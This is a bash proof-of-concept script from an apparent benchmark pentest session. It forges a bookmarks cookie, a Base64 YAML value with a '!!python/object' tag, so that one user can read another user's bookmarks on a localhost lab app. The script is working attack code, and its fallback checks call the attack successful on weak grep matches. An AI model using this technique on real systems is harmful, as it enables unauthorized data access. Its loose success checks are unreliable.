#!/bin/bash
# POC: Demonstrates IDOR vulnerability using the actual Base64-encoded bookmarks cookie from the evidence. Shows that User 2 can access User 1's sensitive bookmarks by directly setting the bookmarks cookie value, confirming lack of server-side authorization validation.
# Target: ./repo
# Created: 2025-12-02T16:17:33.732Z
# Session: benchmark-XBEN-075-24-miorxjbp

# IDOR Cookie Manipulation POC - Cross-User Bookmark Access (Simplified)
# This POC demonstrates that an attacker can access another user's bookmarks
# by manipulating the client-side bookmarks cookie directly

TARGET_URL="${1:-http://localhost:5000}"
echo "[*] IDOR Bookmark Cookie Manipulation POC"
echo "[*] Target: $TARGET_URL"
echo ""

# The bookmarks cookie value from the evidence (Base64 encoded YAML)
USER1_BOOKMARKS_COOKIE="LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICBuYW1lOiBDT05GSURFTlRJQUxfQVBJX0tFWVMKICB1cmw6IGh0dHBzOi8vaW50ZXJuYWwuZXhhbXBsZS5jb20vc2VjcmV0cz9rZXk9YWJjMTIzeHl6Cg=="

# User IDs from evidence
USER1_ID="2814c42f57ff4c608ff178c0e2f420de"
USER2_ID="5c670c3e05104b38a5ee7fce762bccdb"

echo "[*] Attack Scenario:"
echo "[*] User 1 (ID: $USER1_ID) created bookmark: CONFIDENTIAL_API_KEYS"
echo "[*] Bookmark URL: https://internal.example.com/secrets?key=abc123xyz"
echo "[*] User 1's bookmarks cookie (Base64): $USER1_BOOKMARKS_COOKIE"
echo ""

# Step 1: User 2 attempts to access their own bookmarks (legitimate access)
echo "[Step 1] User 2 ($USER2_ID) accessing their own bookmarks (should be empty)..."
USER2_RESPONSE_BEFORE=$(curl -s -b "user=$USER2_ID" "$TARGET_URL/list")

if echo "$USER2_RESPONSE_BEFORE" | grep -q "CONFIDENTIAL_API_KEYS"; then
  echo "[-] ERROR: User 2 already has access to User 1's bookmarks (unexpected)"
  exit 1
else
  echo "[+] User 2's own bookmarks are empty (expected)"
fi
echo ""

# Step 2: IDOR Attack - User 2 manipulates their bookmarks cookie
echo "[Step 2] IDOR ATTACK: User 2 setting bookmarks cookie to User 1's value..."
echo "[*] Sending request with:"
echo "[*]   user cookie: $USER2_ID"
echo "[*]   bookmarks cookie: $USER1_BOOKMARKS_COOKIE"
echo ""

# Make the request with both cookies
ATTACK_RESPONSE=$(curl -s -b "user=$USER2_ID; bookmarks=$USER1_BOOKMARKS_COOKIE" "$TARGET_URL/list")

echo "[Step 3] Analyzing response..."
echo ""

# Check if the attack was successful
if echo "$ATTACK_RESPONSE" | grep -q "CONFIDENTIAL_API_KEYS"; then
  echo "[!!!] VULNERABILITY CONFIRMED!"
  echo "[!!!] User 2 successfully accessed User 1's bookmarks via cookie manipulation!"
  echo ""
  echo "[*] Evidence:"
  echo "$ATTACK_RESPONSE" | grep -E "(CONFIDENTIAL|https://internal)" | head -3
  echo ""
  echo "[!!!] IDOR Attack Successful - Horizontal Privilege Escalation Achieved!"
  echo ""
  echo "[*] Attack Details:"
  echo "[*] - User 2 (different ID) could access User 1's bookmarks"
  echo "[*] - No server-side authorization validation occurred"
  echo "[*] - Bookmarks cookie directly controlled resource access"
  echo ""
  exit 0
elif echo "$ATTACK_RESPONSE" | grep -q "secrets\|abc123xyz"; then
  echo "[!!!] VULNERABILITY CONFIRMED!"
  echo "[!!!] User 2 accessed sensitive bookmark data via IDOR!"
  echo ""
  echo "[!!!] IDOR Attack Successful!"
  exit 0
else
  echo "[-] Attack may have failed - checking for partial evidence..."
  
  # Try alternative detection methods
  if echo "$ATTACK_RESPONSE" | grep -iq "api.*key"; then
    echo "[!!!] VULNERABILITY CONFIRMED! (Alternative detection)"
    echo "[!!!] Sensitive bookmark detected in response"
    exit 0
  else
    echo "[-] Could not confirm IDOR vulnerability"
    echo "[*] Response length: $(echo "$ATTACK_RESPONSE" | wc -c) bytes"
    echo "[*] Response preview:"
    echo "$ATTACK_RESPONSE" | head -30
    exit 1
  fi
fi